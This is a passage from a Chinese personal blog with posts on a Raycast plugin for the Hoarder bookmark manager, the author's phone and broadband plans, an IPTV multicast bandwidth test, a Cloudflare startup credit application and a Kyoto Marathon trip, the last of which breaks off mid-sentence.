上周我开发了一个基于 Sink 的短链管理插件《我开发了一个短链管理插件: Raycast Sink》，上架官方插件商店后，看到已经有几十个用户在使用。昨天又开发了一个基于 Hoarder 的书签管理插件，有了上次的开发经验，这次从初始化项目到最后提交上架，只花了一天时间。同样开源到了我的 Github 上。Github:Raycast HoarderRaycast Store: HoarderHoarder 简介​Hoarder 是一个基于 AI 的书签管理工具，可以自动摘录、识别网页，通过 AI 分析内容、生成标签和摘要。官网:Hoarder仓库:Github: Hoarder体验网站:Hoarder Demo有关这个项目的介绍，大家可以直接看官网和官方文档，官方的文档写得很详细。优点​Self-Hosting，支持自部署，数据自主可控支持 Web、iOS、安卓多端，也有浏览器插件通过 AI 自动给内容打标签，理解网页和图片内容自动保存网页和截图Docker 一键部署，建议用境外服务器，抓取和分析更快。开放 API 支持拓展Raycast Hoarder​我部署完 Hoarder 之后，也安装了浏览器插件和 iOS 应用，感觉整个产品的完成度很高，加上有 API 支持，所以就顺手开发了一个 Raycast 插件，方便管理和使用 Hoarder。列表直接查看书签，支持网址、图片、文本三种格式的预览。增强了搜索功能，支持本地权重搜索和在线搜索。书签详情页支持查看、编辑、删除、打开链接等操作。支持列表和标签列表。由于 Hoarder API有点问题，暂时支持快捷增加文本和链接的书签。为什么要自部署​在上面的优点中，我特意提到了 Self-Hosting，自部署是我最关注的一个点。去年我曾经写过一篇文章《脱钩: 我的个人网络安全策略》，由于工作原因，我已经将很多数据都下云或者放到境外服务器。其实市面上有许多书签管理和笔记管理工具及服务。但是，出于众所周知的原因，在国内的所有内容平台服务都需要进行内容审查。国外也有很多优秀服务，但价格高昂或速度慢。Hoarder这种完全开源、可以自行部署、数据可控性强的工具对于像我这样有技术背景的人来说是一个好选择。
Source: 罗磊的独立博客

**2024年:我用的手机和宽带套餐**
最近这段时间，重新整理了下家里的运营商套餐。也整理下一些对几个运营商和网络的感受和体验，分享给大家。除了国内运营商的套餐，也分享了一些境外的套餐，供参考。🇨🇳 国内套餐总览​运营商套餐主卡副卡通话流量宽带IPTV月均性价比深圳联通5G畅爽冰激凌199元141000分钟60GB✅1000M✅¥89高东莞电信5G畅享融合189元套餐121000分钟40GB✅1000M✅¥189低深圳广电惠民年卡11100分钟118GB❌❌¥19高网络和宽带评分​运营商信号覆盖境内网络质量跨境网络质量公网 IPv4公网 IPv6客服评分深圳联通😐一般😐一般👍好❌✅⭐⭐⭐⭐☆⭐⭐⭐⭐☆东莞电信👍好👍好👎差✅✅⭐⭐⭐⭐☆⭐⭐⭐☆☆深圳广电👍好😐一般👍好--⭐⭐☆☆☆⭐⭐⭐☆☆注意:这里仅仅是我自己的体验和主观评分，不同地区、不同用户的体验可能会有所不同。深圳联通​之前我深圳家里一直用的电信 ¥299/月的 5G 融合套餐，绑定了三年的合约，给电信交了上万块的费用，价格昂贵。2022 年的时候，携号转网到了联通，当时运营商对于携转用户有很大的优惠。原价 ¥199 的套餐三折后只需要 ¥69 /月（所谓:三折冰），包含了 1 张主卡、2 张副卡，1000 分钟通话、60GB 流量、1000M 宽带。手机卡​目前我的主力卡用用的就是联通，4 张副卡都满了，实际花销是 ¥69 + ¥10×2(副卡) = ¥89/月。如果只使用 1-3 张卡，每个月 60GB 的流量，卡均 20GB 的流量，一家三个人或者三台设备用还是很划算的，但是现在我的 4 张副卡都满了，卡均流量下降到了只有 12GB，多出的两张副卡，额外 ¥20 月租，就有点不太划算了。宽带​联通这个套餐附带 1000M 的宽带，过去一直有「南电信北联通」的说法，但是现在体验上，基本已经没有太大差别。如果你有跨境网络的需求，联通的宽带比电信要好很多很多。电信到了晚上高峰期，掉包和延迟都有点惨，相比一下联通就好太多了。但是联通 2024 年开始有了一个致命的问题，可能是前两年拉新的用户太多，加上大量用户使用联通挂 PCDN，现在联通宽带除了不再给 IPv4 的公网，甚至连 IPv6 的公网都不再给了，NAT 也将为了 NAT4。我深圳家中联通尚且还剩下公网的 IPv6.除此之外，联通对于跨省和跨运营商进行限速，到了晚上高峰期，上行速度被限制到 5Mbps，对于我这种需要跨运营商访问家里 NAS 的用户来说，实在是太痛苦了。有关这个问题，我之前也发了一条推:luolei@luoleiorg今年，各大运营商在家庭用户宽带、公网IP、NAT以及跨省和跨运营商通信等方面，频繁采取限制或劣化网络质量的小动作。
昨天，我用电信连回深圳联通家宽，联通的上行带宽被限制到 5Mbps( IPv6/tcp 直连)，但当我切换使用联通网络重联时，联通家宽上行则恢复正常(跑满上行 50Mbps)。
问题说大不大，说小不小，万一你有个文件互传之类的需求，就很蛋疼了。
V站近几个月也陆续出现了相关帖子，涉及全国范围，具体的原因也有讨论涉及:
🔗 每晚八点开始，跨运营商限速 https://v2ex.com/t/1082680
🔗 [讨论] 最近种种迹象表明三大都开始偷偷限制骨干节点跨网互联
https://v2ex.com/t/1082839
🔗 广东联通和广东电信宽带互通已被限速
https://v2ex.com/t/1073989下午11:27 · 2024年10月24日44524其中提到的几个讨论帖子，建议大家可以看看:每晚八点开始，跨运营商限速讨论:最近种种迹象表明三大都开始偷偷限制骨干节点跨网互联广东联通和广东电信宽带互通已被限速在这里还得吐槽下联通的客服，经常能收到联通打过来的推销电话，基本上是 1 到 2 个月一通吧。相反电信这几年基本没打过电话。东莞电信​对于电信这个套餐，现在我感觉就是一个鸡肋：食之无味，弃之可惜。而且电信宽带两个极端的优点和缺点，又让我十分纠结要不要退掉。现在我东莞家电信宽带：¥189/月，1 张主卡，2 张副卡，1000 分钟通话，40GB 流量，送了一个 IPTV。一开始是 500M 宽带，后面免费升级到 1000M。手机卡​现在东莞这几个号给家里人用做流量卡，每个月 40GB 放到现在来说，是在是太少了。我不用东莞的号码，所以手机号对于我来说倒无太大影响。宽带​电信宽带的好处就不多说了，「稳定」算是优点。访问国内的网站，玩游戏基本都是低延迟（虽说我不怎么玩国内的游戏）。上面说到了「又爽又痛」极端的两个点，首先说爽的的地方：公网 IPv4 + IPv6: 从2023年起，深圳和东莞的电信都不再给普通家宽用户提供公网 IPv4 的地址，现在运营商的口径卡得很死，深圳要动态公网 IP 需要额外 ¥100/月。东莞不清楚，但是现在新开的宽带肯定是没有公网 IPv4 了。上行稳定，不限速: 电信的宽带上行速度稳定，不限速，不管是跨省还是跨运营商，都是正常的速度。其实说来也是有点搞笑，上面说的公网IP，放到之前都是基础的服务，现在却成了需要额外申请甚至花钱的地方。我家里有 NAS，平时也经常需要连回家里， DDNS 解析公网 IP，一键回家，并且能够有 50Mbps 的上行带宽，从家里的 NAS 读取文件，看监控，都是很方便的。中国电信东莞公司宣布停止提供普通宽带公网IPV4地址服务东莞电信 - 关于停止提供普通宽带公网 IPV4 地址服务的公告下面就是痛的地方:电信的跨境网络质量实在是太差了，我目前主要使用美国和香港的服务器，由于安全的关系，我所有的服务器都是自建，线路一般，让我不得不采用各种优化策略。不像联通和移动，经常直连就能跑满跨境带宽。除此之外，每个月 ¥189 的价格，对比其他家融合套餐只需百元，还是有点贵，每个月贵上百来块，几年下来，也是几千了（我又想起了之前深圳电信¥299三年，花了一万的冤种历史）。前几个月我也有考虑退掉电信宽带，改成深圳联通的异地宽带，500M 单宽带每个月只需 ¥60，甚至已经预约安装。但是与安装的小哥再三确认后发现，现在新装的宽带，不仅没有了公网 IPv4（这个尚且能理解），甚至连公网的 IPv6 都没有了，这样我就没办法直连回家里的 NAS 了，虽说我也有其他穿透的方案，但是少了直连，总还是有点不爽。深圳广电​十月的时候，新开了一张中国广电的卡，广电号称是第四大运营商，使用移动的基站。我开了一张惠民年卡，¥228/年，每个月 100GB 的流量，叠加活动每个月增加 3+5+10=18GB流量。现在每个月 118GB 的流量，我拿来当副卡放随身 Wi-Fi，另外开了一张副卡，每个月¥6，给我上大学的弟弟当流量卡。最小巧的 5G 随身 Wi-Fi: 中兴 F50广电在深圳、东莞两地的使用体验还是挺不错的，一线城市移动覆盖好，广电用起来还可以，但是偶尔在地下室，停车场可能失联。总之拿来作为一个流量卡还不错，不建议主力使用。🌏 境外套餐总览​国别地区运营商套餐流量通话短信当地月租实际成本🇲🇴 澳门中国电信澳门三地学生套餐60GB600分钟0条MOP$94¥85🇺🇸 美国Ultra MobilePaygo100MB100分钟(Wifi-Calling)100$3¥22🇭🇰 香港Club SimeSIM---$0¥1🇸🇳 尼日利亚MTNeSIM---$0¥1🇲🇴 中国电信澳门​2020 年的时候，远程办了一张中国电信澳门的合约卡，188澳门币/月，包含了 60GB 流量，600分钟通话，0条短信。实际成本是人民币 ¥85/月。这个是中国电信澳门对于留学生的套餐，除了提供一个澳门的号码，还有一个珠海的号码一卡双号。如果在内地使用则半价，澳门的IP，可以合法合规使用 Google、YouTube 等服务。每个月 60GB 的流量极其充足，我拿来当主力卡使用。这个卡国内办卡的路子已经没了，今年也修改了合约，后续不再是全年都半价，改成了「寒、暑假期间（每年12月至次年2月、6月至8月期间），如当月离澳累计共十天或以上，即可享离澳期间每日日均价单半价优惠」。算了下成本从原本的 ¥85/月，变成了 ¥125/月。除了支持在内地漫游，还支持在香港使用，如果经常去香港玩的话，省了开内地号码的漫游。总之这个澳门卡，对得上曾经「神卡」的地位。当然，说了好处，也说说缺点，中国电信澳门这卡在内地，大多情况只能 4G 漫游，只有在少数 NSA 基站才有 5G 网络(例如深圳福田口岸、深圳湾口岸）。大多情况下 4G 漫游能跑到 50Mbps 的速率，日常使用没问题。🇺🇸 美国 Ultra Mobile​从 Google Voice 携号转网到了 Ultra Mobile 美国实体手机卡，然后又转成了 eSIM，。注册大多境外服务都能通过校验。每个月 $3 的纯花销，这算是拥有一个「正宗美国手机号」所需付出的代价吧。我是通过我美国的朋友帮我线下操作的，所以还算顺利。🇭🇰 香港 Club Sim​目前香港最便宜的手机号解决方案，理论上是 $0/月，支持 eSIM。有关这个卡网上也有很多的分享了，适合需要长期持有一个香港手机号的用户。🇸🇳 尼日利亚 MTN​这个比较小众了，我前段时间做了尼日利亚的 BNV 和 NIN 的办理，拥有了一个合法合规的尼日利亚身份。也顺便办了一个 MTN 的 eSIM。开卡花了一点钱，持有成本很低。纯保号用。总结​对于境内的套餐，我的建议是：如果你感觉现在的套餐有点贵，可以咨询下当地携号转网的优惠，现在联通、移动对于携转用户，基本还是能给到不错的折扣。如果你不想转网，也可以主动联系下自己运营商的客服，表明「现在其他套餐更优惠，其他运营商更优惠，可能携号转网」之类的话，对于运营商来说，客服或者营销部门都有一定的灵活操作空间。反正问一下又不花钱，万一省下来了呢。
Source: 罗磊的独立博客

**广东电信 IPTV 组播转单播极限测试**
这两天给家里弄好了 IPTV 的组播转单播，心血来潮，想看看极限能跑多少路 IPTV 直播。有关这次折腾 IPTV 的记录和讨论，我也发到了推特和 V2EX 上。推特:东莞电信 IPTV推特:深圳联通 IPTV推特:突破 1000MV2EX: 广东电信 IPTV 组播极限测试Chiphell:广东电信 IPTV 组播转单播极限测试这篇博客不是教程，由于全国各地不同运营商对于 IPTV 有不同的网络策略，还是建议各位自行以「IPTV + OpenWrt + 组播」等关键字搜索符合当地运营商的教程。由于这次测试「娱乐性质大于技术研究」，加上本人并不是网络相关专业，并且本人家庭设备诸多限制，注定有诸多不严谨的地方，这篇文章只是记录下下结果，不探讨相关运营商、网络、组网等技术细节。简单来说，图一乐就好。组播转单播​IPTV 原始信号是以组播(Multicast)方式传输的通过 udpxy 将组播流转换成 HTTP 单播流(Unicast)这样转换后，内网中的设备就可以通过普通的 HTTP 协议访问这些视频流这种转换的主要优点是：让不支持组播的设备（如手机、平板、智能电视等）也能观看 IPTV突破了原本 IPTV 信号只能在特定接口或设备上观看的限制实现了全屋任意设备都能收看 IPTV 的效果如果家里还有人要看电视，还是推荐可以搞个这个方案，在 AppleTV 、手机、平台上就能直接看直播了，而且没有机顶盒那么多广告。有点可惜现在才弄这套方案，前段时间奥运会期间，和老婆在家看比赛直播还是挺多的。参考资料​简化版:[技术交流] 软路由转发实现全屋任意设备观看 IPTVIPTV 折腾全记录 - 多种方案详解广州电信广东IPTV列表（组播地址）联通 IPTV 组播地址🌐 网络条件​东莞电信 1000M 下/50M 上(有公网 IPv4/IPv6)光猫 2.5G 网口 1 桥接，软路由拨号光猫 iTV 口 桥接: 封装类型 PPPoE 网线连软路由， OpenWrt 配置网口 UDPXY 转发组播（后改为 msd_lite）🔧 硬件配置​光猫: 中兴 7015tv3 (2.5G WAN + 1G ITV)软路由: N5105 4 口 2.5GMacBook Pro: M2 Max/96GB + 2.5G 网卡台式机 PC: i7-8700K/1080 + 万兆网卡Mac Mini: M2 Mini/16GB + 2.5G 网卡所有设备在内网并没有网络瓶颈。测试用的电脑均为 2.5G 内网。除了上述设备，也使用到了 AppleTV、手机等设备进行测试。📡 转发组播​我也是昨天看到/t/102603这个帖子下的留言，发现可以通过「电脑插光猫 ITV 口直接播放」来验证是否能进行组播转发。经过测试，我家东莞电信、深圳联通两地的 IPTV ，都可以满足。我之前被其他帖子误导了，以为要鉴权抓包太麻烦就没搞了。没想到居然这么简单（刚好我的网络条件满足）。🎮 测试播放器​GridPlayer，基于 VLC 开发的多路播放器，支持硬解。gridplayer用 IINA 也试过，最多只能播放 15 个且很卡顿，后来搜到 GridPlayer 发现可以满足需求。广电电信的组播除了表情，也提供 1080P 的直播源，还有少数 4K，我订阅的电视源使用的都是 HD 1080P 25帧的资源，码率 7Mbps - 10Mbps 波动，大多时候是 8Mbps。某些 4K 直播源码率码率则在 30Mbps 左右，但是数量较少，这次我过滤留下了 145 个电视台，144 个是 1080P 25帧。❗ 重要提醒​一开始我使用 UDPXY 作为直播流代理。由于一开始配置的时候填写了最大客户端50的限制，后面测试的时候发现最大播放数量被限制在 55 路，误导我一直以为 IPTV 的最大播放数量被限制了。但是使用 UDPXY 这一步测试结果依旧保留，仅供参考。📊 UDPXY 测试结果​下面以 UDPXY 转发测试过程的一些截图:Mac 最多只能播放 25 路。Mac 那边继续直播 25路，PC 额外播放 30 路，CPU 压力很大。OpenWrt 监测 ITV 口带宽平均下来 500Mbps。V 站有网友评论说 UDPXY CPU 占用率可能导致瓶颈，一开始我的确忽略了这个因素，于是重新又测试了下。当 55 个通道同时播放时，CPU使用率在 50% 到 70% 之间波动，每个 UDPXY 进程占用 1%到2% 的CPU。但是可以推测，如果继续使用 UDPXY 进行转发，播放到 100 路的时候，CPU 占有率的确有可能达到 100%。📺 UDPXY 占用网络带宽​总路数PC 播放路数Mac 播放路数IPTV 总带宽占用家宽测速结果IPTV状态30300300Mbps1300Mbps正常播放503020450-460Mbps1300Mbps正常播放553025490-500Mbps1300Mbps无法新增直播流，新增会导致原有直播随机断开一路Mac 跑到 25 路就到顶了(CPU 高负载+风扇难得跑了起来)，系统不卡顿，但是播放器卡顿。PC 能撑到 30 路（Mac 那边 25 路还在运行），可添加无限源但超过会卡顿，已达 CPU 和显卡瓶颈，系统卡顿，播放器可能崩溃。每路都是不同的电视台源，上面 55 路同时播放流畅不卡顿。跑满时，家庭局域网其他设备(AppleTV/手机) IPTV 客户端无法再播放，OpenWrt 监测 iTV 网口带宽平均速率 500Mbps。⚡ msd_lite 测试结果​27 号晚上，看到有人提到了 msd_lite，相比 UDPXY，msd_lite CPU 和内存占用更低 ，于是我又重新用 msd_lite 测试了下。也是在这个时候，我才发现 UDPXY 配置里面有个最大客户端数 50 的限制，于是干脆重新测试，也因此得出了新的数据和结论，由于上面 UDPXY 测试时就已经达到了 1000M ，msd_lite 直接跳过，直接以 1000Mbps 向上的压力测试。同时为了突破网口的物理限制，我将光猫上的 iTV 口绑定到了 2.5G 口上，原本的网络则改到了 1G 网口上。msd_lite这一轮测试，出动了 M2 Max MacBook / PC / M2 Mac Mini 共三台设备测试，同时客厅的 AppleTV 也在 4 路同屏一直播放（三台电脑同时播放时，硬件性能瓶颈太大都会卡顿，AppleTV 4 路直播不会因为硬件问题瓶颈，作为一个标定参考组)。M2 Max MacBook 一直播放 62 路不停止，画面都能出来，但是播放不流畅，CPU 占用率 60-80% 之间波动。旁边的 M2 Mini 则固定播放 25 路。📺 msd_lite 占用网络带宽​总路数PC 播放路数Mac 播放路数Mini 播放路数AppleTV 播放路数IPTV 总带宽占用家宽测速结果IPTV状态91062254900-1000Mbps1000Mbps除了电脑卡顿，其他端流畅播放,AppleTV 播放流畅10842622541200-1300Mbps10~100Mbps除了电脑端卡顿，其余端流畅播放，开始影响网速14756622541400~1500Mbps10~~100 Mbps播放卡顿感明显,少数源出现马赛克，ATV 正常播放但是加载偶尔出现进度条，家宽网速限速到 100M 以内200721002541500+Mbps1000 Mbps❓极限重复 200 路测试，虽说 IPTV 达到 1.2G 之后大概率限速，但是实测依旧偶尔能够跑满 1000M 网络宽带PC 在播放 56 路时，CPU 压力依旧很大。在 147 路播放时，OpenWrt 监测 ITV 口带宽平均速率达到了 1.42 Gbps，约 1454 Mbps。后续尝试再增加无法突破。改成 msd_lite 后，CPU 使用率明显下降，147 路播放时，CPU 在 50%-80% 之间波动。上述播放，每个设备都是播放不同的电视源，最终是 145 路电视台同时播放。接下来又分别将 M2 Max MacBook 和 PC 分别增加到 100 路和 72 路，重复播放 50 路。Mac 上这 10x10 的布局画面都展示出来了，但是无法流畅播放，幻灯片一样。在 200 路播放的时候，iTV 的网口的流量达到了 1.4-1.45Gps ,对应约 1500Mbps 的带宽，与 147 路播放时一样，说明有可能是达到了 IPTV 线路的带宽上限。🐎 IPTV 网速影响测试​在上面 UDPXY 测试的时候，由于我的 IPTV 最高带宽也才 1000Mbps，网络带宽在 2.5Gps 网口下均能跑到 1300M，在 1G 网口下也能跑到 1000M。因此当时我得出结论是：IPTV 带宽不会影响家宽带宽。但是随着后面转向 msd_lite，将 IPTV 的带宽进一步提升到 1.2Gps ，乃至最高的 1.47Gps 时，我发现了有趣的现象.当播放 147 路，OpenWrt 监测 ITV 口带宽平均速率达到了 1.42Gps，约 1500Mbps。这个时候访问电信官网测速，下行下降到了两位数，在20-100Mbps 之间波动。随后我关闭 PC 上的直播，总路数下降到91，网速恢复正常。后续我又尝试恢复 PC 上的直播，当PC的播放数量为7*6 = 42路时，iTV 带宽 1.2G 左右，若继续增加播放数量，在上升到 1.25G左右，网速则受影响下载到 100 Mbps 以内。原本我以为运营商应该是对家宽和 IPTV 的限速做了某种策略，这个 IPTV 达到 1.2Gps 之后，可能会触发家宽线路的限速。但是随后又发生了一件奇怪的事情。当我将播放数量增加到 200 路时，这时 iTV 的带宽又达到了 1.4-1.47Gbps 波动，这个时候我测速结果发现网速又回到了 1000M。这个时候我就不知道如何解释了。📈 总结​如同我在最开头所说的这次测试「娱乐性质大于技术研究」。这次折腾 IPTV，更多是「好玩」性质，没有哪个正常的家庭会有这种同时播放这么多路电视的需求。最终的结论可能并不严谨，它仅代表了在我家网络和硬件条件下对东莞电信IPTV的测试结果。东莞电信 1000M 套餐附送的 IPTV，在 2.5G XGPON 光猫下，IPTV 能跑到 1.5 Gbps 的带宽。理论可支持 140+路 1080P 的直播。当 IPTV 带宽低于 1.2Gbps 占用时，不影响原有的家庭网络带宽。当 IPTV 带宽高于 1.2Gbps 时，有一定的几率，会触发家庭网络的限速。（注：1.2 Gps ≈ 1,229 Mbps，1.5 Gps ≈ 1,536 Mbps）
Source: 罗磊的独立博客

**Cloudflare 创业扶持计划申请经验**
最近申请了 Cloudflare 的创业扶持计划并获得了通过，拿到了 $5000 的额度。这个计划是 CF 家去年 9 月上线的，由于中文社区暂时没看到相关的分享案例，特此整理申请经验，希望能帮助到有类似需求的开发者。提醒：这是 Cloudflare 为创业者提供的正式支持计划，希望大家珍惜资源，善意申请和使用。滥用可能会影响后续申请者的审核难度。项目概况​申请地址：cloudflare.com/forstartups/官方博客:Startup Program revamped: build and grow on Cloudflare with up to $250,000 in credits支持额度：最高可提供 $250K额度使用期限：自审批通过起 1 年内有效申请条件​满足以下任一条件即可申请（最终需通过人工审核）：基本条件：​正在开发基于软件的产品或服务公司成立不超过 5 年获得了 5 万到 500 万美元的融资拥有 LinkedIn 账号拥有有效的网站和邮箱地址加分项：​属于认可的创业加速器账号邮箱与域名匹配上面是官方的要求，实际并不是特别严，填写的内容也不要额外提供营业执照或者公司注册文件之类的，实际上我唯一提供的就是产品的官网。申请经验分享​产品准备​建议有实际的产品和可访问的官网（我有一个面向海外的商业 SaaS 应用，官网都齐全）最好已经在使用 Cloudflare 的产品（我的业务有付费使用 R2 、Images 、Worker ）可以附上自己的开源项目、Github 、Twitter 等社交媒体资料，这些可能会有加分材料准备​Comments 部分一定要认真填写，这是审核的重要参考，可以说说自己的产品是做什么的，自己的团队未来可能会开发什么产品。建议使用公司域名邮箱 -尽可能完整描述你的产品和团队情况审核时间​我填完申请表格后，大约两个星期之后，收到了确认邮件。下面是邮件的原文部分:plaintextCongratulations! We’ve successfully applied the Cloudflare credits to your account for up to $5,000 USWhat does this mean?You now have up to 1 year to use up to $5,000 USD in credits. You will be able to see your remaining credit balance on your invoices for usage-based products.For usage-based billing products (such as Workers usage, Argo traffic, R2 Object Storage, Stream, etc.), your invoices will draw down from the $5k credit. So don't worry that these invoices look a little different.Please read all terms and conditions that apply to the Startup Program here and here; including but not limited to: all Registrar purchases are excluded from the credits and must be paid for in full using the payment method associated with your account, and there is a limit of up to $5,000 USD for any R2 or Cache services.Upgrading to Enterprise PlanIf you’re ready to upgrade your domain to an Enterprise plan, follow these steps:Log into your Cloudflare Dashboard.Under "Websites," click on the website you'd like to upgrade.On the "Overview" tab, scroll down to "Active Subscription," and click "Change" next to your current plan type.On the next page, select "Enterprise" and click "Confirm" to upgrade your zone.This process ensures you can fully leverage the benefits of your Enterprise-level credits.123456789101112131415161718192021222324252627额度使用说明​下面这部分是审核确认邮件中的额外说明:按量付费产品​以下产品费用会从额度中扣除：Workers 使用费用Argo 流量费用R2 对象存储Stream 服务等固定订阅产品​以下费用会直接显示为 $0：Pro/Business 订阅费用 -Argo 月费（$5 ） Workers 月费等使用限制​域名注册相关费用不包含在内 R2 或 Cache 服务使用额度上限为 $5000注意事项​目前仪表盘无法直接显示剩余额度可通过月度账单左上角查看额度使用情况额度有效期为一年，用完或到期即止总结建议​Cloudflare 被成为赛博菩萨，我自己也使用了 Cloudflare 的许多产品和服务，如果你正在开发面向海外市场的产品，尤其是如果你已经在使用 Cloudflare 的产品了，建议可以申请这个扶持计划。
Source: 罗磊的独立博客

**京都马拉松: 第一次去日本跑马**
第 4 次去日本，这次是去参加 2025 京都马拉松，也是我的第 10 场全马。去年报名了东京马拉松，不出意外，依旧没有中签。刚好看到京都马拉松也在报名，就直接报了名，海外报名费用是 30,000 日元，约 $200 美元，我还额外定制了号码簿和几个纪念品，加上税费，光报名就花了将近 ¥1700 人民币。这次京都马拉松在 2 月 16 日举行，老婆刚好放完春节假期，开年比较忙，这次日本之行就是我一个人去了。去之前出了点幺蛾子，出发前一周，突然感冒发烧，老婆和我妈都让我别去了，心里实在是有点不想浪费，在家休息了一个星期，每天水果、喝水、吃药，出发前总算没咳嗽了。但是这个也注定我这次京都马拉松与成绩无缘了。最终我也就是抱着「完赛就好」的心态就行。今天这波博客，依旧跟之前类似，流水记录下这次京都马拉松的行程和感受。DAY1 深圳・大阪・京都​2 月 14 情人节，这次乘坐的航班是深圳航空，深圳往返大阪，这也是我第二次去大阪。早上 11 点的航班，全程约 4 个小时，一路倒也看了不少不知名的山川。即将落地大阪关西国际机场。去年 5 月同老婆去过一次东京，疫情之后，国际差旅终于慢慢恢复了。关西空港，落地之后直接从这里坐特快到京都。提前在 klook 上买了关西机场到京都的 haruka 特快车票,¥2,200 日元，约 100 人民币。在京都站的交通和换乘指引还是很清晰，小红书上也有很多攻略，现在出行，基本已经不怎么使用传统的马蜂窝、穷游之类的旅游网站了，小红书、抖音上的资讯更加实时和丰富。没想到我一个中年男人，还能坐到这么萌萌哒的列车。从关西到京都约1个半小时，在列车上见到了大阪的落日。晚上 7 点，到达京都。这也是我第一次来京都。出站之后，见到京都塔，应该也算个地标？由于这次我是一个人来，也没啥旅行的计划，坐公交直奔酒店。京都是个不大的城市，这次住的酒店离京都站只有 3 公里，距离马拉松起跑的体育馆只有 1.5 公里，只要约 500 人民币一晚，对比起东京的酒店，我推开门之后看到这个大小不由得有点惊讶，没想到居然这么大。这是白天拍的酒店，中间那栋黑色的小楼。酒店对面有一家LIFE超市，属于日本的中档超市，挺多当地人在这买东西的，之前几次来日本，最多就是去便利店买买吃喝的东西，对物价感知不明显，今天去酒店对面的超市逛了逛，怎么感觉日本人民群众买这些东西价格，跟我平时买的价格都差不多甚至更便宜。京都最近温度在0摄氏度到10摄氏度区间，早早就睡了，看了下酒店配的电视是国产的 TCL，遥控器真长。DAY2 马拉松展会・闲逛​第二天睡到自然醒，今天是去马拉松展会领物资，在公交车站看到了京都马拉松的招牌，也有对交通影响的告示，京都马拉松这段时间，全城各处都有标志，很有氛围。京都马拉松展会在平安神宫附近的京都市劝业馆。10点半开始检录，我10点就到了，还没什么人。10 点 30 后，进到展馆内，海外选手有个单独的窗口，有中文服务，听口音应该是一个台湾人。京都向来是台湾的热门旅游目的地。领到了这次的赛事包，我的号码牌上面印有「罗罗磊磊」的简体字，报名的时候额外花了点年定制的，以后留着纪念。旁边的红色袋子里也是额外花钱的纪念品。除了号码簿，里面大多都是广告，比起 $200 美元的报名费，送的这些物资还是比较寒酸的。展馆二楼还有一层，有相关的马拉松资讯和赞助商的展位。有一堵印有所有参赛选手姓名的墙，不少人在这签字留念，可惜我没找到自己的名字。京都马拉松的线路图。这次马拉松沿途供给的饮食，也有展示，京都马拉松一路吃的还是挺多的。京都马拉松历届的奖牌，还是比较精致的，算是我拿过的奖牌中比较好看的了，当然，现在国内马拉松的奖牌设计也越来越精致了。展会中还有主持节目，对于我一个「日语」一窍不通的人来说，只能看看了。领完的物资，接下来我就在附近逛了逛，这块也是京都热门旅游打卡地。在京都的这几天，基本都是公交出行，京都这巴士看着年代感十足，但是车内设施还是挺新的。附近的平安神宫，看介绍是纪念京都建都1100周年，于1895年建造的，也是在这一年，大清与日本明治政府签下了《马关条约》。这次京都之行只有我一个人，没有计划，也没有压力，只带了一台相机，随便逛逛，拍拍照。一支乌鸦停在屋檐的千木上，今天气温虽然不高，但是有太阳，还是挺舒服的。路过一个圆山公园，现在还没到樱花季，等再过一个月过来应该就很漂亮了。现在是京都旅游的淡季，游客不多，虽然我在京都的热门区域，但是人也不太多，也这算错峰之行的另类体验吧。看到一个神奇的店，原来这个冈本和服已经有 180 年历史的老店了。快到中午了，约了朋友吃饭，往市区走的路上，路过一个八坂神社，碰到有新人在这举行婚礼。上次去东京也见到新人婚礼，这种传统婚礼应该还是挺成熟的，控制时间，有专人控场，也不太会影响到周围的游客。这条纵穿京都的小河，就是著名的鸭川，也是京都的一个地标，这次京都马拉松有很长的一段赛道也是沿着鸭川。来到京都四条，这里是京都的繁华商业区，也是京都的中心地带。看到了 Apple Store，去年日元汇率很好，加上日版 iPhone 不锁 AI，在国补之前，日版 iPhone 去年属于一个挺香的选择。给老婆在大丸百货的 LV 买了一个小包，比起国内便宜不少，退税也很方便。继续在四条附近逛逛，京都没有多少高楼，街道纵横。路过中京郵便局，没想到也有百年历史了。朋友推荐，来吃了一家号称日本最好的抹茶冰激凌，听说这家店还挺有名的。路过京都文化博物馆，这个就是建于 1988 年的新建筑了。晚餐吃了碗拉面，每次跑马之前，我都会吃得比较清淡。吃完饭，坐公交回酒店路上，见到了 Shake Shack，之前在纽约倒也见到过，但是我第一次吃这个是在上海，后来在深圳万象也吃过，反正国内这玩意很贵又一般。虽然现在是旅游淡季，但是京都本地生活还是挺热闹的。时间也不早了，明天就要跑马了，今天居然在京都走了 10公里，比赛前的一天，这个量有点大了。DAY3 比赛日​第二天，早上 9 点起跑，8 点 15 停止检录，我 6 点半起床，运气比较差，可能昨天在外走得太多，加上有点吹风，晚上又咳嗽起来，还有点低烧，一夜是没怎么睡好。今天的比赛，目标就是「完赛了」。步行来到起跑点。早上的天气阴沉沉的，天气预报说今天有雨，加上身体状态不是很好，我特别担心下雨。更不巧的是，我忘记带雨衣了。来到体育馆内，脱掉外套，换上了运动装备后，来到存包的地方。体育馆不大，人很多。这一次我是 G 区起跑，位置比较靠后，但是还是在体育馆内，趁着现在人还不太多，让路人给我拍了一张照片，还是之前的那身装备，习惯了舒服。起跑仪式没有太多花哨的表演，8点55分，首先是轮椅运动员起跑，9点整准时起跑。京都马拉松全程赛道都不宽，加上参赛人数众多，一路周围人都不少。跑着跑着，太阳出来了，如果不是身体状态不好，这个天气还是挺适合跑马的，加上气温也不高，其实挺容易刷成绩。路过一个寺庙，里面的和尚也出来给大家加油，翻译一下是「心怀希望，一路向前」。路过一个朱红色的鸟居，鸟居是日本神道教神社的传统入口标志，象征着从世俗空间进入神圣空间的过渡。来到了鸭川河边，过了桥之后，看到后面还有很多很多跑者。这一段也算是京都马拉松的精髓路段了。从 15 公里之后，每间隔5km，补给点就开始供给食物了，从饼干、面包到水果，种类还行。京都马拉松每个补给点十分规范，水杯里也会提示这杯水有多少量，提示「1/3」,「3/5」之类的水量，方便跑者补水，而且有个小细节，在食物的补给台之后，肯定还会再有一个饮用水补给台，方便跑者吃完东西后再进行补水。终于到达半程中间点位置了，这个时候我的时间，已经到达2小时17分，比我过往 2小时出头的成绩慢了将近 15 分钟。这次京都马拉松，我在 10 公里的时候，身体就已经撞墙，前一周身体状态不佳的影响提前出现了，表现就是 10 公里开始就感受到「很饿」，两腿发软，让我不得不提前吃能量胶。路过一个路人的食物点。这次京都马拉松，让我印象最深的是京都的观赛民众，日本的长跑文化十分发达，民间也有很多跑步爱好者，这次京都马拉松，从小孩到老人，一路都能看到很多人在路边为跑者加油。我这一路都是听着「干巴爹」，参赛的氛围还是十分棒的。这是第 14 